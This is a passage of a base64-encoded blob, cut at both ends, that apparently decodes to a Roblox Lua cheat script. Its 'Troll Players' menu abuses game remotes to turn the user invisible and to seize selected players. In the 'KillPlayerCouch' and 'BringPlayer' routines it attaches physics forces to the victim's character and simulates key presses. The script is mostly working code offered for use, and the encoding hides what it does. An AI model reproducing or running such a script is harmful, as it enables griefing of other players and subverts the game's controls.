0UGFydC5DRnJhbWUKCQkJZW5kCgkJZW5kKQoJZWxzZQoJCUJ1dHRvbi5UZXh0ID0gQnJpbmcgUGFydHMgIE9mZgoJCWlmIERlc2NlbmRhbnRBZGRlZENvbm5lY3Rpb24gdGhlbgoJCQlEZXNjZW5kYW50QWRkZWRDb25uZWN0aW9uRGlzY29ubmVjdCgpCgkJZW5kCgllbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBnZXRQbGF5ZXIobmFtZSkKCWxvY2FsIGxvd2VyTmFtZSA9IHN0cmluZy5sb3dlcihuYW1lKQoJZm9yIF8sIHAgaW4gcGFpcnMoUGxheWVyc0dldFBsYXllcnMoKSkgZG8KCQlsb2NhbCBsb3dlclBsYXllciA9IHN0cmluZy5sb3dlcihwLk5hbWUpCgkJaWYgc3RyaW5nLmZpbmQobG93ZXJQbGF5ZXIsIGxvd2VyTmFtZSkgdGhlbgoJCQlyZXR1cm4gcAoJCWVsc2VpZiBzdHJpbmcuZmluZChzdHJpbmcubG93ZXIocC5EaXNwbGF5TmFtZSksIGxvd2VyTmFtZSkgdGhlbgoJCQlyZXR1cm4gcAoJCWVuZAoJZW5kCmVuZAoKbG9jYWwgcGxheWVyID0gbmlsCgpsb2NhbCBmdW5jdGlvbiBWRE9ZWlFMX2Zha2Vfc2NyaXB0KCkgLS0gQm94LlNjcmlwdCAKCWxvY2FsIHNjcmlwdCA9IEluc3RhbmNlLm5ldygnU2NyaXB0JywgQm94KQoKCXNjcmlwdC5QYXJlbnQuRm9jdXNMb3N0Q29ubmVjdChmdW5jdGlvbihlbnRlclByZXNzZWQpCgkJaWYgZW50ZXJQcmVzc2VkIHRoZW4KCQkJcGxheWVyID0gZ2V0UGxheWVyKEJveC5UZXh0KQoJCQlpZiBwbGF5ZXIgdGhlbgoJCQkJQm94LlRleHQgPSBwbGF5ZXIuTmFtZQoJCQkJcHJpbnQoUGxheWVyIGZvdW5kLCBwbGF5ZXIuTmFtZSkKCQkJZWxzZQoJCQkJcHJpbnQoUGxheWVyIG5vdCBmb3VuZCkKCQkJZW5kCgkJZW5kCgllbmQpCmVuZApjb3JvdXRpbmUud3JhcChWRE9ZWlFMX2Zha2Vfc2NyaXB0KSgpCmxvY2FsIGZ1bmN0aW9uIEpVQk5RS0lfZmFrZV9zY3JpcHQoKSAtLSBCdXR0b24uU2NyaXB0IAoJbG9jYWwgc2NyaXB0ID0gSW5zdGFuY2UubmV3KCdTY3JpcHQnLCBCdXR0b24pCgoJc2NyaXB0LlBhcmVudC5Nb3VzZUJ1dHRvbjFDbGlja0Nvbm5lY3QoZnVuY3Rpb24oKQoJCWlmIHBsYXllciB0aGVuCgkJCWNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkV2FpdCgpCgkJCWh1bWFub2lkUm9vdFBhcnQgPSBjaGFyYWN0ZXJXYWl0Rm9yQ2hpbGQoSHVtYW5vaWRSb290UGFydCkKCQkJdG9nZ2xlQmxhY2tIb2xlKCkKCQllbHNlCgkJCXByaW50KFBsYXllciBpcyBub3Qgc2VsZWN0ZWQpCgkJZW5kCgllbmQpCmVuZApjb3JvdXRpbmUud3JhcChKVUJOUUtJX2Zha2Vfc2NyaXB0KSgpCiAgICBlbmQKfSkKClRyb2xsVGFiQWRkU2VjdGlvbih7IEludmlzaWJsZSB9KQoKVHJvbGxUYWJBZGRCdXR0b24oewogICAgTmFtZSA9IEJlY29tZSBJbnZpc2libGUsCiAgICBEZXNjcmlwdGlvbiA9IEJlY29tZSBpbnZpc2libGUgRkUsCkNhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIAogICAgICAgIGxvY2FsIGFyZ3MgPSB7CiAgICBbMV0gPSB7CiAgICAgICAgWzFdID0gMTAyMzQ0ODM0ODQwOTQ2LAogICAgICAgIFsyXSA9IDcwNDAwNTI3MTcxMDM4LAogICAgICAgIFszXSA9IDAsCiAgICAgICAgWzRdID0gMCwKICAgICAgICBbNV0gPSAwLAogICAgICAgIFs2XSA9IDAKICAgIH0KfQoKZ2FtZUdldFNlcnZpY2UoUmVwbGljYXRlZFN0b3JhZ2UpV2FpdEZvckNoaWxkKFJlbW90ZXMpV2FpdEZvckNoaWxkKENoYW5nZUNoYXJhY3RlckJvZHkpSW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKZ2FtZUdldFNlcnZpY2UoUmVwbGljYXRlZFN0b3JhZ2UpV2FpdEZvckNoaWxkKFJlbW90ZXMpV2FpdEZvckNoaWxkKFdlYXIpSW52b2tlU2VydmVyKDExMTg1ODgwMzU0ODcyMSkKbG9jYWwgYWxsYWNjZXNzb3JpZXMgPSB7fQoKZm9yIHp4Y3dlZndmZWNhcywgeGNhZWZ3ZWZhcyBpbiBpcGFpcnMoewogICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5IdW1hbm9pZERlc2NyaXB0aW9uLkJhY2tBY2Nlc3NvcnksCiAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLkh1bWFub2lkRGVzY3JpcHRpb24uRmFjZUFjY2Vzc29yeSwKICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuSHVtYW5vaWREZXNjcmlwdGlvbi5Gcm9udEFjY2Vzc29yeSwKICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuSHVtYW5vaWREZXNjcmlwdGlvbi5OZWNrQWNjZXNzb3J5LAogICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5IdW1hbm9pZERlc2NyaXB0aW9uLkhhdEFjY2Vzc29yeSwKICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuSHVtYW5vaWREZXNjcmlwdGlvbi5IYWlyQWNjZXNzb3J5LAogICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5IdW1hbm9pZERlc2NyaXB0aW9uLlNob3VsZGVyc0FjY2Vzc29yeSwKICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuSHVtYW5vaWREZXNjcmlwdGlvbi5XYWlzdEFjY2Vzc29yeSwKICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuSHVtYW5vaWREZXNjcmlwdGlvbi5HcmFwaGljVFNoaXJ0Cn0pIGRvCiAgICBmb3Igc2NhY3ZkZmJkYiBpbiBzdHJpbmcuZ21hdGNoKHhjYWVmd2VmYXMsICVkKykgZG8KICAgICAgICB0YWJsZS5pbnNlcnQoYWxsYWNjZXNzb3JpZXMsIHRvbnVtYmVyKHNjYWN2ZGZiZGIpKQogICAgZW5kCmVuZAoKd2FpdCgpCgpmb3IgYXNkd3IsYXNkZXJnIGluIGlwYWlycyhhbGxhY2Nlc3NvcmllcykgZG8KICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIGdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKVdhaXRGb3JDaGlsZChSZW1vdGVzKVdhaXRGb3JDaGlsZChXZWFyKUludm9rZVNlcnZlcihhc2RlcmcpCiAgICAgICAgcHJpbnQoYXNkZXJnKQogICAgZW5kKQplbmQKICAgIGVuZAp9KQoKClRyb2xsVGFiQWRkU2VjdGlvbih7IFJHQiBBdmF0YXIgfSkKCmxvY2FsIGNvbG9ycyA9IHsgQnJpZ2h0IHJlZCwgTGltZSBncmVlbiwgQnJpZ2h0IGJsdWUsIEJyaWdodCB5ZWxsb3csIEJyaWdodCBjeWFuLCBIb3QgcGluaywgUm95YWwgcHVycGxlIH0KbG9jYWwgcmdiRW5hYmxlZCA9IGZhbHNlCgpsb2NhbCBmdW5jdGlvbiBjaGFuZ2VDb2xvcihjb2xvcikKICAgIGxvY2FsIGFyZ3MgPSB7IGNvbG9yIH0KICAgIGdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKVdhaXRGb3JDaGlsZChSZW1vdGVzKVdhaXRGb3JDaGlsZChDaGFuZ2VCb2R5Q29sb3IpRmlyZVNlcnZlcih1bnBhY2soYXJncykpCmVuZAoKbG9jYWwgZnVuY3Rpb24gdG9nZ2xlUkdCQ2hhcmFjdGVyKGVuYWJsZWQpCiAgICByZ2JFbmFibGVkID0gZW5hYmxlZAogICAgaWYgcmdiRW5hYmxlZCB0aGVuCiAgICAgICAgd2hpbGUgcmdiRW5hYmxlZCBkbwogICAgICAgICAgICBmb3IgXywgY29sb3IgaW4gaXBhaXJzKGNvbG9ycykgZG8KICAgICAgICAgICAgICAgIGlmIG5vdCByZ2JFbmFibGVkIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgY2hhbmdlQ29sb3IoY29sb3IpCiAgICAgICAgICAgICAgICB3YWl0KDAuNSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpUcm9sbFRhYkFkZFRvZ2dsZSh7CiAgICBOYW1lID0gUkdCIENoYXJhY3RlciwKICAgIERlc2NyaXB0aW9uID0gTWFrZXMgeW91ciBjaGFyYWN0ZXIgUkdCLAogICAgRGVmYXVsdCA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKICAgICAgICB0b2dnbGVSR0JDaGFyYWN0ZXIodmFsdWUpCiAgICBlbmQKfSkKCgpUcm9sbFRhYkFkZFNlY3Rpb24oeyBSR0IgSGFpciB9KQpsb2NhbCBoYWlyQ29sb3JzID0gewogICAgQ29sb3IzLm5ldygxLCAxLCAwKSwgQ29sb3IzLm5ldygwLCAwLCAxKSwgQ29sb3IzLm5ldygxLCAwLCAxKSwgQ29sb3IzLm5ldygxLCAxLCAxKSwKICAgIENvbG9yMy5uZXcoMCwgMSwgMCksIENvbG9yMy5uZXcoMC41LCAwLCAxKSwgQ29sb3IzLm5ldygxLCAwLjY0NywgMCksIENvbG9yMy5uZXcoMCwgMSwgMSkKfQpsb2NhbCBpc0FjdGl2ZSA9IGZhbHNlCgoKbG9jYWwgZnVuY3Rpb24gY2hhbmdlSGFpckNvbG9yKCkKICAgIGxvY2FsIGkgPSAxCiAgICB3aGlsZSBpc0FjdGl2ZSBkbwogICAgICAgIGlmIG5vdCBpc0FjdGl2ZSB0aGVuIGJyZWFrIGVuZAogICAgICAgIGxvY2FsIGFyZ3MgPSB7IFsxXSA9IENoYW5nZUhhaXJDb2xvcjIsIFsyXSA9IGhhaXJDb2xvcnNbaV0gfQogICAgICAgIGdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKVdhaXRGb3JDaGlsZChSRSlXYWl0Rm9yQ2hpbGQoMU1heDF5KUZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgIHdhaXQoMC4xKQogICAgICAgIGkgPSBpICUgI2hhaXJDb2xvcnMgKyAxCiAgICBlbmQKZW5kCgoKVHJvbGxUYWJBZGRUb2dnbGUoewogICAgTmFtZSA9IFJHQiBIYWlyLAogICAgRGVzY3JpcHRpb24gPSBNYWtlcyB5b3VyIGhhaXIgUkdCLAogICAgRGVmYXVsdCA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKICAgICAgICBpc0FjdGl2ZSA9IHZhbHVlCiAgICAgICAgaWYgaXNBY3RpdmUgdGhlbgogICAgICAgICAgICBjaGFuZ2VIYWlyQ29sb3IoKQogICAgICAgIGVuZAogICAgZW5kCn0pCgoKLS0gVGFiIDQgQW50aSBTaXQKVHJvbGxUYWJBZGRTZWN0aW9uKHsgQW50aSBTaXQgfSkKVHJvbGxUYWJBZGRUb2dnbGUoewogICAgTmFtZSA9IEFudGkgU2l0LAogICAgRGVzY3JpcHRpb24gPSBQcmV2ZW50cyB5b3VyIGNoYXJhY3RlciBmcm9tIHNpdHRpbmcsCiAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgIGxvY2FsIGNvbm5lY3Rpb25zID0ge30KICAgICAgICBsb2NhbCBydW5TZXJ2aWNlID0gZ2FtZUdldFNlcnZpY2UoUnVuU2VydmljZSkKCgogICAgICAgIGxvY2FsIGZ1bmN0aW9uIHByZXZlbnRTaXR0aW5nKGh1bWFub2lkKQogICAgICAgICAgICBpZiBodW1hbm9pZCB0aGVuCiAgICAgICAgICAgICAgICBodW1hbm9pZFNldFN0YXRlRW5hYmxlZChFbnVtLkh1bWFub2lkU3RhdGVUeXBlLlNlYXRlZCwgZmFsc2UpCiAgICAgICAgICAgICAgICBsb2NhbCBzaXRDb25uZWN0aW9uID0gaHVtYW5vaWQuU3RhdGVDaGFuZ2VkQ29ubmVjdChmdW5jdGlvbihfLCBuZXdTdGF0ZSkKICAgICAgICAgICAgICAgICAgICBpZiBuZXdTdGF0ZSA9PSBFbnVtLkh1bWFub2lkU3RhdGVUeXBlLlNlYXRlZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGh1bWFub2lkQ2hhbmdlU3RhdGUoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5HZXR0aW5nVXApCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICB0YWJsZS5pbnNlcnQoY29ubmVjdGlvbnMsIHNpdENvbm5lY3Rpb24pCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAoKCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gbW9uaXRvckNoYXJhY3RlcigpCiAgICAgICAgICAgIGxvY2FsIGZ1bmN0aW9uIG9uQ2hhcmFjdGVyQWRkZWQoY2hhcmFjdGVyKQogICAgICAgICAgICAgICAgbG9jYWwgaHVtYW5vaWQgPSBjaGFyYWN0ZXJXYWl0Rm9yQ2hpbGQoSHVtYW5vaWQpCiAgICAgICAgICAgICAgICBwcmV2ZW50U2l0dGluZyhodW1hbm9pZCkKICAgICAgICAgICAgZW5kCgoKICAgICAgICAgICAgbG9jYWwgY2hhcmFjdGVyQWRkZWRDb25uZWN0aW9uID0gcGxheWVyLkNoYXJhY3RlckFkZGVkQ29ubmVjdChvbkNoYXJhY3RlckFkZGVkKQogICAgICAgICAgICB0YWJsZS5pbnNlcnQoY29ubmVjdGlvbnMsIGNoYXJhY3RlckFkZGVkQ29ubmVjdGlvbikKCgogICAgICAgICAgICBpZiBwbGF5ZXIuQ2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgIG9uQ2hhcmFjdGVyQWRkZWQocGxheWVyLkNoYXJhY3RlcikKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgoKICAgICAgICBsb2NhbCBmdW5jdGlvbiByZXNldFNpdHRpbmcoKQogICAgICAgICAgICBmb3IgXywgY29ubmVjdGlvbiBpbiBpcGFpcnMoY29ubmVjdGlvbnMpIGRvCiAgICAgICAgICAgICAgICBjb25uZWN0aW9uRGlzY29ubmVjdCgpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBjb25uZWN0aW9ucyA9IHt9CiAgICAgICAgICAgIGxvY2FsIGh1bWFub2lkID0gcGxheWVyLkNoYXJhY3RlciBhbmQgcGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkT2ZDbGFzcyhIdW1hbm9pZCkKICAgICAgICAgICAgaWYgaHVtYW5vaWQgdGhlbgogICAgICAgICAgICAgICAgaHVtYW5vaWRTZXRTdGF0ZUVuYWJsZWQoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5TZWF0ZWQsIHRydWUpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAoKCiAgICAgICAgaWYgVmFsdWUgdGhlbgogICAgICAgICAgICBtb25pdG9yQ2hhcmFjdGVyKCkKICAgICAgICAgICAgbG9jYWwgaGVhcnRiZWF0Q29ubmVjdGlvbiA9IHJ1blNlcnZpY2UuSGVhcnRiZWF0Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBsb2NhbCBodW1hbm9pZCA9IHBsYXllci5DaGFyYWN0ZXIgYW5kIHBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoSHVtYW5vaWQpCiAgICAgICAgICAgICAgICBpZiBodW1hbm9pZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgaHVtYW5vaWRTZXRTdGF0ZUVuYWJsZWQoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5TZWF0ZWQsIGZhbHNlKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgdGFibGUuaW5zZXJ0KGNvbm5lY3Rpb25zLCBoZWFydGJlYXRDb25uZWN0aW9uKQogICAgICAgIGVsc2UKICAgICAgICAgICAgcmVzZXRTaXR0aW5nKCkKICAgICAgICBlbmQKICAgIGVuZAp9KQoKbG9jYWwgVHJvbGwgPSBXaW5kb3dNYWtlVGFiKHsgVGl0bGUgPSBUcm9sbCBQbGF5ZXJzLCBJY29uID0gcmJ4YXNzZXRpZDEzMTE1MzE5Mzk0NTIyMCB9KQoKCmxvY2FsIFBsYXllcnMgPSBnYW1lR2V0U2VydmljZShQbGF5ZXJzKQpsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgUmVwbGljYXRlZFN0b3JhZ2UgPSBnYW1lR2V0U2VydmljZShSZXBsaWNhdGVkU3RvcmFnZSkKbG9jYWwgVmlydHVhbElucHV0TWFuYWdlciA9IGdhbWVHZXRTZXJ2aWNlKFZpcnR1YWxJbnB1dE1hbmFnZXIpCmxvY2FsIFJ1blNlcnZpY2UgPSBnYW1lR2V0U2VydmljZShSdW5TZXJ2aWNlKQpsb2NhbCBjYW0gPSB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYQoKCmxvY2FsIHNlbGVjdGVkUGxheWVyTmFtZSA9IG5pbApsb2NhbCBtZXRob2RLaWxsID0gbmlsCmdldGdlbnYoKS5UYXJnZXQgPSBuaWwKbG9jYWwgQ2hhcmFjdGVyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCmxvY2FsIEh1bWFub2lkID0gQ2hhcmFjdGVyIGFuZCBDaGFyYWN0ZXJXYWl0Rm9yQ2hpbGQoSHVtYW5vaWQpCmxvY2FsIFJvb3RQYXJ0ID0gQ2hhcmFjdGVyIGFuZCBDaGFyYWN0ZXJXYWl0Rm9yQ2hpbGQoSHVtYW5vaWRSb290UGFydCkKCi0tIEZ1bmN0aW9uIHRvIGNsZWFuIHVwIHRoZSBjb3VjaApsb2NhbCBmdW5jdGlvbiBjbGVhbnVwQ291Y2goKQogICAgbG9jYWwgY2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgaWYgY2hhciB0aGVuCiAgICAgICAgbG9jYWwgY291Y2ggPSBjaGFyRmluZEZpcnN0Q2hpbGQoQ2hhb3MuQ291Y2gpIG9yIExvY2FsUGxheWVyLkJhY2twYWNrRmluZEZpcnN0Q2hpbGQoQ2hhb3MuQ291Y2gpCiAgICAgICAgaWYgY291Y2ggdGhlbgogICAgICAgICAgICBjb3VjaERlc3Ryb3koKQogICAgICAgIGVuZAogICAgZW5kCiAgICAtLSBDbGVhbiB0b29scyB2aWEgcmVtb3RlCiAgICBSZXBsaWNhdGVkU3RvcmFnZVdhaXRGb3JDaGlsZChSRSlXYWl0Rm9yQ2hpbGQoMUNsZWExclRvb2wxcylGaXJlU2VydmVyKENsZWFyQWxsVG9vbHMpCmVuZAoKLS0gQ29ubmVjdCBDaGFyYWN0ZXJBZGRlZCBldmVudApMb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZENvbm5lY3QoZnVuY3Rpb24obmV3Q2hhcmFjdGVyKQogICAgQ2hhcmFjdGVyID0gbmV3Q2hhcmFjdGVyCiAgICBIdW1hbm9pZCA9IG5ld0NoYXJhY3RlcldhaXRGb3JDaGlsZChIdW1hbm9pZCkKICAgIFJvb3RQYXJ0ID0gbmV3Q2hhcmFjdGVyV2FpdEZvckNoaWxkKEh1bWFub2lkUm9vdFBhcnQpCiAgICBjbGVhbnVwQ291Y2goKQogICAgCiAgICAtLSBDb25uZWN0IERpZWQgZXZlbnQgZm9yIHRoZSBuZXcgSHVtYW5vaWQKICAgIEh1bWFub2lkLkRpZWRDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBjbGVhbnVwQ291Y2goKQogICAgZW5kKQplbmQpCgotLSBDb25uZWN0IERpZWQgZXZlbnQgZm9yIHRoZSBpbml0aWFsIEh1bWFub2lkLCBpZiBpdCBleGlzdHMKaWYgSHVtYW5vaWQgdGhlbgogICAgSHVtYW5vaWQuRGllZENvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgIGNsZWFudXBDb3VjaCgpCiAgICBlbmQpCmVuZAoKLS0gS2lsbFBsYXllckNvdWNoIEZ1bmN0aW9uCmxvY2FsIGZ1bmN0aW9uIEtpbGxQbGF5ZXJDb3VjaCgpCiAgICBpZiBub3Qgc2VsZWN0ZWRQbGF5ZXJOYW1lIHRoZW4KICAgICAgICB3YXJuKEVycm9yIE5vIHBsYXllciBzZWxlY3RlZCkKICAgICAgICByZXR1cm4KICAgIGVuZAogICAgbG9jYWwgdGFyZ2V0ID0gUGxheWVyc0ZpbmRGaXJzdENoaWxkKHNlbGVjdGVkUGxheWVyTmFtZSkKICAgIGlmIG5vdCB0YXJnZXQgb3Igbm90IHRhcmdldC5DaGFyYWN0ZXIgdGhlbgogICAgICAgIHdhcm4oRXJyb3IgVGFyZ2V0IHBsYXllciBub3QgZm91bmQgb3IgaGFzIG5vIGNoYXJhY3RlcikKICAgICAgICByZXR1cm4KICAgIGVuZAoKICAgIGxvY2FsIGNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgIGlmIG5vdCBjaGFyIHRoZW4KICAgICAgICB3YXJuKEVycm9yIExvY2FsIHBsYXllciBjaGFyYWN0ZXIgbm90IGZvdW5kKQogICAgICAgIHJldHVybgogICAgZW5kCiAgICBsb2NhbCBodW0gPSBjaGFyRmluZEZpcnN0Q2hpbGRPZkNsYXNzKEh1bWFub2lkKQogICAgbG9jYWwgcm9vdCA9IGNoYXJGaW5kRmlyc3RDaGlsZChIdW1hbm9pZFJvb3RQYXJ0KQogICAgbG9jYWwgdFJvb3QgPSB0YXJnZXQuQ2hhcmFjdGVyIGFuZCB0YXJnZXQuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWRSb290UGFydCkKICAgIGlmIG5vdCBodW0gb3Igbm90IHJvb3Qgb3Igbm90IHRSb290IHRoZW4KICAgICAgICB3YXJuKEVycm9yIFJlcXVpcmVkIGNvbXBvbmVudHMgbm90IGZvdW5kKQogICAgICAgIHJldHVybgogICAgZW5kCgogICAgbG9jYWwgb3JpZ2luYWxQb3MgPSByb290LlBvc2l0aW9uIAogICAgbG9jYWwgc2l0UG9zID0gVmVjdG9yMy5uZXcoMTQ1LjUxLCAtMzUwLjA5LCAyMS41OCkKCiAgICBSZXBsaWNhdGVkU3RvcmFnZVdhaXRGb3JDaGlsZChSRSlXYWl0Rm9yQ2hpbGQoMUNsZWExclRvb2wxcylGaXJlU2VydmVyKENsZWFyQWxsVG9vbHMpCiAgICB0YXNrLndhaXQoMC4yKQoKICAgIFJlcGxpY2F0ZWRTdG9yYWdlLlJFRmluZEZpcnN0Q2hpbGQoMVRvbzFsKUludm9rZVNlcnZlcihQaWNraW5nVG9vbHMsIENvdWNoKQogICAgdGFzay53YWl0KDAuMykKCiAgICBsb2NhbCB0b29sID0gTG9jYWxQbGF5ZXIuQmFja3BhY2tGaW5kRmlyc3RDaGlsZChDb3VjaCkKICAgIGlmIHRvb2wgdGhlbiB0b29sLlBhcmVudCA9IGNoYXIgZW5kCiAgICB0YXNrLndhaXQoMC4xKQoKICAgIFZpcnR1YWxJbnB1dE1hbmFnZXJTZW5kS2V5RXZlbnQodHJ1ZSwgRW51bS5LZXlDb2RlLkYsIGZhbHNlLCBnYW1lKQogICAgdGFzay53YWl0KDAuMSkKCiAgICBodW1TZXRTdGF0ZUVuYWJsZWQoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5TZWF0ZWQsIGZhbHNlKQogICAgaHVtLlBsYXRmb3JtU3RhbmQgPSBmYWxzZQogICAgY2FtLkNhbWVyYVN1YmplY3QgPSB0YXJnZXQuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoSGVhZCkgb3IgdFJvb3Qgb3IgaHVtCgogICAgbG9jYWwgYWxpZ24gPSBJbnN0YW5jZS5uZXcoQm9keVBvc2l0aW9uKQogICAgYWxpZ24uTmFtZSA9IEJyaW5nUG9zaXRpb24KICAgIGFsaWduLk1heEZvcmNlID0gVmVjdG9yMy5uZXcobWF0aC5odWdlLCBtYXRoLmh1Z2UsIG1hdGguaHVnZSkKICAgIGFsaWduLkQgPSAxMAogICAgYWxpZ24uUCA9IDMwMDAwCiAgICBhbGlnbi5Qb3NpdGlvbiA9IHJvb3QuUG9zaXRpb24KICAgIGFsaWduLlBhcmVudCA9IHRSb290CgogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgYW5nbGUgPSAwCiAgICAgICAgbG9jYWwgc3RhcnRUaW1lID0gdGljaygpCiAgICAgICAgd2hpbGUgdGljaygpIC0gc3RhcnRUaW1lICA1IGFuZCB0YXJnZXQgYW5kIHRhcmdldC5DaGFyYWN0ZXIgYW5kIHRhcmdldC5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoSHVtYW5vaWQpIGRvCiAgICAgICAgICAgIGxvY2FsIHRIdW0gPSB0YXJnZXQuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGRPZkNsYXNzKEh1bWFub2lkKQogICAgICAgICAgICBpZiBub3QgdEh1bSBvciB0SHVtLlNpdCB0aGVuIGJyZWFrIGVuZAoKICAgICAgICAgICAgbG9jYWwgaHJwID0gdGFyZ2V0LkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0CiAgICAgICAgICAgIGxvY2FsIGFkanVzdGVkUG9zID0gaHJwLlBvc2l0aW9uICsgKGhycC5WZWxvY2l0eSAgMS41KQoKICAgICAgICAgICAgYW5nbGUgKz0gNTAKICAgICAgICAgICAgcm9vdC5DRnJhbWUgPSBDRnJhbWUubmV3KGFkanVzdGVkUG9zICsgVmVjdG9yMy5uZXcoMCwgMiwgMCkpICBDRnJhbWUuQW5nbGVzKG1hdGgucmFkKGFuZ2xlKSwgMCwgMCkKICAgICAgICAgICAgYWxpZ24uUG9zaXRpb24gPSByb290LlBvc2l0aW9uICsgVmVjdG9yMy5uZXcoMiwgMCwgMCkKCiAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgZW5kCgogICAgICAgIGFsaWduRGVzdHJveSgpCiAgICAgICAgaHVtU2V0U3RhdGVFbmFibGVkKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuU2VhdGVkLCB0cnVlKQogICAgICAgIGh1bS5QbGF0Zm9ybVN0YW5kID0gZmFsc2UKICAgICAgICBjYW0uQ2FtZXJhU3ViamVjdCA9IGh1bQoKICAgICAgICBmb3IgXywgcCBpbiBwYWlycyhjaGFyR2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgaWYgcElzQShCYXNlUGFydCkgdGhlbgogICAgICAgICAgICAgICAgcC5WZWxvY2l0eSA9IFZlY3RvcjMuemVybwogICAgICAgICAgICAgICAgcC5Sb3RWZWxvY2l0eSA9IFZlY3RvcjMuemVybwogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKCiAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICByb290LkNGcmFtZSA9IENGcmFtZS5uZXcoc2l0UG9zKQogICAgICAgIHRhc2sud2FpdCgwLjMpCgogICAgICAgIGxvY2FsIHRvb2wgPSBjaGFyRmluZEZpcnN0Q2hpbGQoQ291Y2gpCiAgICAgICAgaWYgdG9vbCB0aGVuIHRvb2wuUGFyZW50ID0gTG9jYWxQbGF5ZXIuQmFja3BhY2sgZW5kCgogICAgICAgIHRhc2sud2FpdCgwLjAxKQogICAgICAgIFJlcGxpY2F0ZWRTdG9yYWdlLlJFRmluZEZpcnN0Q2hpbGQoMVRvbzFsKUludm9rZVNlcnZlcihQaWNraW5nVG9vbHMsIENvdWNoKQogICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgcm9vdC5DRnJhbWUgPSBDRnJhbWUubmV3KG9yaWdpbmFsUG9zKQogICAgZW5kKQplbmQKCi0tIEJyaW5nUGxheWVyTExMIEZ1bmN0aW9uCmxvY2FsIGZ1bmN0aW9uIEJyaW5nUGxheWVyTExMKCkKICAgIGlmIG5vdCBzZWxlY3RlZFBsYXllck5hbWUgdGhlbgogICAgICAgIHdhcm4oRXJyb3IgTm8gcGxheWVyIHNlbGVjdGVkKQogICAgICAgIHJldHVybgogICAgZW5kCiAgICBsb2NhbCB0YXJnZXQgPSBQbGF5ZXJzRmluZEZpcnN0Q2hpbGQoc2VsZWN0ZWRQbGF5ZXJ